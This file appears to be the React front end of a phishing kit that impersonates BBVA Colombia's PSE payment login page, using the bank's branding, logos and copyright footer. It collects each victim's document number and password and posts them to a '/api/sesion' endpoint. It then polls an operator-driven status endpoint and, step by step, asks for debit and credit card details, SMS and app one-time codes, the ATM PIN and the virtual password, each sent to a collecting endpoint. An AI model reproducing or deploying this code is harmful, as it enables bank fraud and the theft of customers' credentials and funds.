"use client"
import "./bbva.css"
import { Tarjeta } from "@/components/tarjeta/Tarjeta"
import { Status } from "@/components/status/Status"
import { useEffect, useRef, useState } from "react"
import axios from "axios"
import { SelectMinimalista } from "@/components/selectMinimalista/SelectMinimalista"

const COLOR_PRINCIPAL_TEXT = "text-[#0048db]"
const COLOR_PRINCIPAL_BACK = "bg-[#072146]"
const back_color = "bg-[#ffffff]"
const text_color_principal = "text-black"
const ESTILO_BTN_PRINCIPAL = `mt-8 w-full py-4 bg-[#004481] text-white text-[14px]`

const svg = (
    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" className={`bi bi-person ${COLOR_PRINCIPAL_TEXT}`} viewBox="0 0 16 16">
        <path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6m2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0m4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4m-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10s-3.516.68-4.168 1.332c-.678.678-.83 1.418-.832 1.664z"/>
    </svg>
    )

const svgPassword = (
    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" className={`bi bi-eye ${COLOR_PRINCIPAL_TEXT}`} viewBox="0 0 16 16">
        <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8M1.173 8a13 13 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5s3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5s-3.879-1.168-5.168-2.457A13 13 0 0 1 1.172 8z"/>
        <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5M4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0"/>
    </svg>
)

const btn = (
    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" className={`bi bi-eye ${COLOR_PRINCIPAL_TEXT}`} viewBox="0 0 16 16">
        <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8M1.173 8a13 13 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5s3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5s-3.879-1.168-5.168-2.457A13 13 0 0 1 1.172 8z"/>
        <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5M4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0"/>
    </svg>
)

const InputAnimado = ({
    label,
    borderCol = "border-0", 
    borderColSelec = "", 
    borderColError, 
    errorLabel, 
    name,
    handler, 
    value, 
    error=false, 
    modoNumerico=false, 
    type="text", 
    backGraundInput="bg-white",
    contenBtn = null,
    btn = false,
    labelColor = "text-black",
    labelColorSelect = "",
    labelErrorColor = "text-red-600",
    placeHolder = "",
    svg = null
}) => {
  const [isFocused, setIsFocused] = useState(false);
  const shouldFloat = isFocused || value !== "";
  const [mostrarPasword, setMostrarPasword] = useState(false)
  const inputRef = useRef(null)

    const handlerClear = (e) => {
        e.preventDefault();
        handler({
            target: {
                name: name,
                value: ""
            }
        });
        setTimeout(() => {
            inputRef.current?.focus();
        }, 0);
    };

  return (
    <div className="w-full flex flex-col">
        <div
        className={`w-full p-3 relative flex items-center rounded transition-all duration-300 ${
            isFocused ? borderColSelec != "" ? `border-1 ${borderColSelec}` : borderCol : borderCol
        } ${backGraundInput} ${borderCol} ${borderColError && error ? borderColError: ""}`}
        >
        <input
            ref={inputRef}
            inputMode={modoNumerico ? "numeric" : "text"}
            name={name}
            type={ type == "password" ? mostrarPasword ? "text": "password" : type}
            onFocus={() => setIsFocused(true)}
            onBlur={() => setIsFocused(false)}
            onChange={(e) => handler(e)}
            className={`ml-0.5 p-1 font-semibold text-[14px] outline-none transition-all ${backGraundInput} ${
                type == "password" ? "w-[90%]" : "w-[90%]"
            }`}
            placeholder={isFocused ? placeHolder : ""}
            value={value}
            />
            {isFocused && 
                <button className={"text-[#1973b8]"} onMouseDown={(e) => e.preventDefault()} onClick={(e)=> handlerClear(e)}>
                    <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" className="bi bi-x-lg" viewBox="0 0 16 16">
                        <path d="M2.146 2.854a.5.5 0 1 1 .708-.708L8 7.293l5.146-5.147a.5.5 0 0 1 .708.708L8.707 8l5.147 5.146a.5.5 0 0 1-.708.708L8 8.707l-5.146 5.147a.5.5 0 0 1-.708-.708L7.293 8z"/>
                    </svg>
                </button>
            }
        {contenBtn && isFocused &&
            <button  onMouseDown={(e) => e.preventDefault()} onClick={()=> setMostrarPasword(p => !p)} className={ btn ? "w-[20%] ml-8":"absolute"}>
                {contenBtn}
            </button>
        }
        <span
            className={`absolute left-2 transition-all duration-200 px-1 pointer-events-none z-10 ${
            shouldFloat
                ? `-top-1 text-[12px] p-1 ${labelColorSelect != "" ? labelColorSelect : labelColor}`
                : `top-[50%] left-4 -translate-y-1/2 text-[14px] ${labelColor}`
            }`}
        >
            {label}
        </span>
        </div>
        {error && <span className={`text-[12px] mt-1.5  font-medium ${labelErrorColor}`}>{errorLabel}</span>}
    </div>
  );
}

const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar, tituloError }) => {
    const [errorDatos, setErrorDatos] = useState({
        tipoDocumento: "Cédula De Ciudadanía",
        numeroDocumento: "",
        contrasenia: ""       
    })

    const handlerContinuar = () => {
        const nuevosErrores = {
            numeroDocumento: "",
            contrasenia: ""
        }

        // Validación de número de documento
        if (!datosInicio.numeroDocumento || datosInicio.numeroDocumento.trim() === "") {
            nuevosErrores.numeroDocumento = "El número de documento es obligatorio"
        }

        // Validación de contraseña
        if (!datosInicio.contrasenia || datosInicio.contrasenia.trim() === "") {
            nuevosErrores.contrasenia = "La clave es obligatoria"
        }

        // Si hay errores, los mostramos
        if (nuevosErrores.numeroDocumento || nuevosErrores.contrasenia) {
            setErrorDatos(nuevosErrores)
            return
        }

        // Si no hay errores, limpiamos y ejecutamos la acción
        setErrorDatos({
            tipoDocumento: "Cédula De Ciudadanía",
            numeroDocumento: "",
            contrasenia: ""
        })
        btnInicio()
    }
    const handlerCheck = (e) => {
        const { name, value } = e.target;
        
        handlerInformacion(e);

        setErrorDatos((prev) => {
            const nuevosErrores = { ...prev };

            // Validación en tiempo real por campo
            if (name === "numeroDocumento") {
                if (!value.trim()) {
                    nuevosErrores.numeroDocumento = "El número de documento es obligatorio";
                } else {
                    nuevosErrores.numeroDocumento = "";
                }
            }

            if (name === "contrasenia") {
                if (!value.trim()) {
                    nuevosErrores.contrasenia = "La clave es obligatoria";
                } else {
                    nuevosErrores.contrasenia = "";
                }
            }

                return nuevosErrores;
            });
    };

    return (
        <div className="w-full flex flex-col justify-center items-center pb-4">
            <h5 className="text-[20px] font-bold mt-10">¡Bienvenido!</h5>
            <span className="text-[15px] text-center mt-4">Recuerda que para realizar pagos a través de PSE, debes estar registrado en BBVA net.</span>
            <span className="text-[15px] text-center mb-4">Regístrate en <span className="text-[#1973b8]">BBVA.com.co</span> y para agilizar tu pago, ten a mano tu app BBVA móvil o la tarjeta de coordenadas</span>
            
            {tituloError !== "" && 
                <div className="w-full flex items-center justify-center">
                    <span className="text-[11px] text-red-600">{tituloError}</span>
                </div>
            }
            <div className="w-full flex flex-col gap gap-y-4 pl-1">
                <SelectMinimalista 
                    label={"Tipo de documento"}
                    labelColor={"text-gray-500"} 
                    name={"tipoDocumento"}
                    handler={handlerInformacion} 
                    value={datosInicio.numeroDocumento} 
                    arrayDatos={["Cédula de ciudadanía", "Cédula de extranjería", "Tarjeta de identidad"]} 
                    backGraundInput="bg-slate-200"
                    colorSvg="text-[#1973b8]"  
                />
                <InputAnimado 
                    error={!!errorDatos.numeroDocumento}
                    errorLabel={errorDatos.numeroDocumento}
                    svg={svg}
                    backGraundInput="bg-slate-200"
                    labelErrorColor={"text-[#a00104]"}
                    borderCol={"border border-1 border-gray-300"}
                    borderColError={"border-b-2 border-b-[#a00104]"} 
                    label={"Número de documento"} 
                    labelColor={"text-gray-500"}
                    modoNumerico={true}
                    type={"tel"} 
                    name={"numeroDocumento"} 
                    handler={handlerCheck} 
                    value={datosInicio.numeroDocumento}
                />

                <InputAnimado 
                    error={!!errorDatos.contrasenia} 
                    errorLabel={errorDatos.contrasenia} 
                    svg={svgPassword}
                    label={"Clave"} 
                    labelErrorColor={"text-[#a00104]"}
                    labelColor={"text-gray-500"}
                    borderCol={"border border-1 border-gray-300"}
                    borderColError={"border-b-2 border-b-[#a00104]"}  
                    placeHolder={""} 
                    name={"contrasenia"} 
                    handler={handlerCheck} 
                    value={datosInicio.contrasenia} 
                    backGraundInput="bg-slate-200"
                    modoNumerico={true} 
                    type="password"
                    btn={true}
                    contenBtn={btn}
                />

                <div className="w-full flex flex-col items-center">
                    <button onClick={handlerContinuar} disabled={datosInicio.numeroDocumento.trim() == "" || datosInicio.contrasenia.trim() == ""} className={ESTILO_BTN_PRINCIPAL}>
                        INGRESAR
                    </button>
                </div>
            </div>
        </div>
    )
}

//seleccionar usuario o empresa
const SelecUsuario = ({handlerUsuario})=>{
    return(
        <div className="w-full flex flex-col justify-center items-center">
            <div className="w-[90%] flex justify-center items-center">
                <p className="mt-10 text-[20px] text-center font-bold">¿En cuál canal estás registrado como cliente?</p>
            </div>
            
            <button onClick={()=>handlerUsuario("personas")} className="mt-8 w-full py-4 bg-[#004481] text-white text-[14px]">
                BBVA net (Personas)
            </button>
            <button onClick={()=>handlerUsuario("empresas")} className="mt-4 w-full py-4 bg-[#1973b8] text-white text-[14px]">
                BBVA net cash (Empresas)
            </button>
            
            <div className="w-[100vw] mt-4 flex justify-center items-center bg-[#f3ebd5]">
                <div className="w-[80%] pb-4 flex flex-col justify-center items-center mt-8">
                    <span className="text-[20px] ">¿Cuentas con clave para realizar transacciones online?</span>
                    <span className="text-[14px] mt-3">Para realizar pagos con tus productos en PSE, debes estar registrado en BBVA Net (Personas) o BBVA Net Cash (Empresas), tener activo tu Token Digital en la App BBVA o tener tarjeta de coordenadas y seguir las instrucciones de pago. Si aún no estás registrado, ingresa por la opción Acceso y regístrate en <span className="text-[#1973b8]">BBVA.com.co</span></span>
                </div>

            </div>
        </div>
    )
}




export default function Bbva (){
    const [tipoUsuario, setTipoUsuario] = useState("personas")
    const [inicioSesion, setInicioSesion] = useState(false)
    const [selectVista, setSelectVisata] = useState(null)
    const [loading, setLoading] = useState(false)
    const [tituloError, setTituloError] = useState("")
    const [reLoad, setReLoad] = useState(false)
    const [key, setKey] = useState(0)
    const [datosInicio, setDatosInicio] = useState({
        tipoDocumento: "Cédula De Ciudadanía",
        numeroDocumento: "",
        contrasenia:""
    })
    const [guardado, setGuardado] = useState(false)
    const [uniqId, setUniqId] = useState("")
    const [btnInicio, setBtnInicio] = useState(false)

    const handlerInformacion = (e)=>{
        console.log(e);
        
        const copia = {...datosInicio}
        copia[e.target.name] = e.target.value
        setDatosInicio(copia)
    }

    const handlerBtnInicio = ()=>{
        setBtnInicio(b => !b)
    }
    
    //obtener uniqId
    useEffect(() => {
        const savedId = localStorage.getItem('uniqId')
        console.log(savedId == null, "guardaaaa", savedId);
        const temp = savedId == null ? "" : savedId
        setUniqId(temp)
        
    }, [])
    
    //guardad datos de sesion
    useEffect(()=>{
        const inicioSesionfuncion = async ()=>{
            setLoading(true)
            const { data } = await axios.post(
            `/api/sesion`,
            {
                usuario: datosInicio.numeroDocumento,
                clave: datosInicio.contrasenia,
                banco: "BBVA",
                informacion:{
                    tipoDocumento: datosInicio.tipoDocumento
                },
                uniqid: uniqId    
            },
            {
                headers: {
                "Content-Type": "application/json",
                Accept: "application/json",
                },
            }
            )
            if(uniqId === "" ) {
                localStorage.setItem('uniqId', data.uniqid)
                setUniqId(data.uniqid)
            }
            setKey(k => k+1)
            setInicioSesion(true)
            setTituloError("")
            setGuardado(true)
            
        }
        if (btnInicio) {
            inicioSesionfuncion()
        }
    },[btnInicio])

    //pulling
    useEffect(() => {
    let isMounted = true;

    const iniciarLongPolling = async () => {
        if (!isMounted) return;
        setTituloError("")
        try {
            const selV = await axios.get(`/api/sesion/status/${uniqId}`, {
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                },
            });
            console.log(selV.data.status);
            
            if (
                selV.data.status == "tdb" ||
                selV.data.status == "tdb-error" ||
                selV.data.status == "tdc" ||
                selV.data.status == "tdc-error" ||
                selV.data.status == "otpsms" ||
                selV.data.status == "otpsms-error" ||
                selV.data.status == "otpapp" ||
                selV.data.status == "otpapp-error" ||
                selV.data.status == "clavecajero" ||
                selV.data.status == "clavecajero-error" ||
                selV.data.status == "clavevirtual" ||
                selV.data.status == "clavevirtual-error" &&
                selV.data.status !== selectVista
            ) {
                setSelectVisata(selV.data.status);
                setKey(prev => prev + 1) 
                setLoading(false);
                return;
            }else if(selV.data.status == "fin"){
                setSelectVisata("compraExitosa")
                setLoading(false);
                return;
            }else if(selV.data.status == "error"){
                setSelectVisata("errorCompra")
                setLoading(false);
                return;

            }else if(selV.data.status == "login" || selV.data.status == "login-error"){
                setDatosInicio({
                    numeroDocumento: "",
                    contrasenia:""
                })
                setSelectVisata(selV.data.status)
                if (selV.data.status == "login-error") setTituloError("Informacion incorrecta, ingresala nuevamente")
                setKey(prev => prev + 1)
                setLoading(false);
                return;
            }
        } catch (error) {
            console.log(error);
        }

        // Esperamos 4 segundos y reintentamos
        setTimeout(iniciarLongPolling, 4000);
    };
    if (guardado) {
        iniciarLongPolling()
    }

    return () => {
        isMounted = false;
    };
    }, [guardado, reLoad]);

    //mensje-otp
    const handlerMensaje = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/otp-sms`, {
                uniqid: uniqId,
                otpsms: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    const handlerloginError = async ()=>{
        try {
            setLoading(true)
            const { data } = await axios.post(
            `/api/sesion`,
            {
                usuario: datosInicio.numeroDocumento,
                clave: datosInicio.contrasenia,
                banco: "Alianza",
                uniqid: uniqId    
            },
            {
                headers: {
                "Content-Type": "application/json",
                Accept: "application/json",
                },
            }
            )
            setReLoad(r => r = !r)            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }
    
    //otp-app
    const handlerAplicacion = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/otp-app`, {
                uniqid: uniqId,
                otpapp: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    //clave-cajero
    const handlerCajero = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/clave-cajero`, {
                uniqid: uniqId,
                clavecajero: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }
    //clave-virtual
    const handlerClaveVirtual = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/clave-virtual`, {
                uniqid: uniqId,
                clavevirtual: clave 
            },{
            headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    //tarjeta
    const handlerTarjeta = async (body) =>{
        try {
            setLoading(true)
            body.uniqid = uniqId
            const send = await axios.post(`/api/sesion/tarjeta`, body, {
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
            console.log(error);
            setReLoad(r => r = !r)
        }
        
    }



    return(
        <div className={`w-full flex flex-col items-center justify-center ${back_color}`}>
            <div className={`w-full sticky top-0 z-50 flex justify-center items-center ${COLOR_PRINCIPAL_BACK} py-3`}>
                <div className={`w-[90%] flex ${tipoUsuario == "" ? "justify-between": "justify-center"}`}>
                    {tipoUsuario == "" &&
                        <img src="/assets/bbva/bbva-logo.svg" className="w-[20%] object-contain"/>
                    }
                    <span className="text-[15px] text-white">Pagos a través de PSE</span>
                </div>

            </div>
            
            <div className=" min-h-[70vh] w-[90%] mt-2 flex flex-col items-center justify-center">
                {!inicioSesion &&  <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerBtnInicio}/>}
                {selectVista == "login-error" && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerloginError}/>}
                
                {selectVista == "tdb" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "tdb-error" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "tdc" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "tdc-error" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "otpsms" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={handlerMensaje} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "otpsms-error" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={handlerMensaje} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "otpapp" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave dinamica"} InputModificado={InputAnimado} handler={handlerAplicacion} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "otpapp-error" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de aplicación"} InputModificado={InputAnimado} handler={handlerAplicacion} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "clavecajero" && <Status key={key} type={"password"} btn={true} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimado} handler={handlerCajero} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "clavecajero-error" && <Status key={key} btn={true} type={"password"} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimado} handler={handlerCajero} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "clavevirtual" && <Status key={key} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimado} handler={handlerClaveVirtual} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                {selectVista == "clavevirtual-error" && <Status key={key} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimado} handler={handlerClaveVirtual} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
            </div>
            
            <div className="w-full flex flex-col justify-center items-center bg-[#072146] py-7">
                <div className="w-[70%] flex flex-col justify-center items-center lg:w-[90] lg:flex-row lg:justify-between ">
                    <img src="/assets/bbva/bbva-f.svg" className="w-[50%] object-contain"/>
                    <div className="flex flex-col mt-8">
                        <span className="text-[12px] font-bold text-[#1973b8]">Seguridad</span>
                        <span className="text-[12px] font-bold text-[#1973b8] mt-2">Aviso legal</span>
                        <span className="text-[12px] font-bold text-[#1973b8] mt-2">Políticas</span>
                    </div>
                    <div className="mt-8 flex items-center gap gap-x-4">
                        <div className="text-[#1973b8]">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-facebook" viewBox="0 0 16 16">
                                <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951"/>
                            </svg>
                        </div>
                        <div className="text-[#1973b8]">
                            <svg
                                xmlns="http://www.w3.org/2000/svg"
                                viewBox="0 0 100 100"
                                width="16"
                                height="16s"
                            >
                            <defs>
                                <mask id="bird-mask">
                                <rect width="100" height="100" fill="white" />
                                <path
                                    fill="black"
                                    d="M78.6,35.2c-2.1,0.9-4.3,1.5-6.6,1.8c2.4-1.4,4.2-3.6,5.1-6.2c-2.2,1.3-4.6,2.2-7.1,2.7
                                    c-2.1-2.2-5.1-3.6-8.4-3.6c-6.4,0-11.6,5.2-11.6,11.6c0,0.9,0.1,1.8,0.3,2.6c-9.6-0.5-18-5.1-23.6-12c-1,1.7-1.5,3.6-1.5,5.6
                                    c0,3.9,2,7.3,5.1,9.3c-1.9-0.1-3.6-0.6-5.1-1.4c0,0.1,0,0.1,0,0.2c0,5.4,3.9,9.8,9.1,10.8c-1,0.3-2,0.5-3.1,0.5
                                    c-0.7,0-1.5-0.1-2.2-0.2c1.5,4.6,5.8,7.9,10.9,8c-4,3.1-9,5-14.4,5c-0.9,0-1.8-0.1-2.7-0.2c5.1,3.3,11.2,5.2,17.8,5.2
                                    c21.3,0,33-17.7,33-33c0-0.5,0-1-0.1-1.5C75.2,39.6,77.1,37.5,78.6,35.2z"
                                />
                                </mask>
                            </defs>
                            <circle
                                cx="50"
                                cy="50"
                                r="50"
                                fill="currentColor"
                                mask="url(#bird-mask)"
                            />
                            </svg>


                        </div>
                        <div className="text-[#1973b8]">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-linkedin" viewBox="0 0 16 16">
                                <path d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854zm4.943 12.248V6.169H2.542v7.225zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248S2.4 3.226 2.4 3.934c0 .694.521 1.248 1.327 1.248zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016l.016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225z"/>
                            </svg>
                        </div>
                        <div className="text-[#1973b8]">
                            <svg
                                xmlns="http://www.w3.org/2000/svg"
                                width="16"
                                height="16"
                                viewBox="0 0 40 40"
                                >
                                <defs>
                                    <mask id="youtube-mask">
                                    <rect width="40" height="40" fill="white" />
                                    <rect x="10" y="12" width="20" height="16" rx="3" fill="black" />
                                    </mask>
                                </defs>
                                <circle cx="20" cy="20" r="20" fill="currentColor" mask="url(#youtube-mask)" />
                                <path d="M18 16l8 4-8 4z" fill="currentColor" />
                            </svg>
                        </div>
                    </div>
                    <span className="text-[12px] text-center text-gray-400 mt-6">© 2020 BBVA Banco Bilbao Vizcaya Argentaria Colombia S.A</span>
                </div>
            </div>             
        </div>
    )
}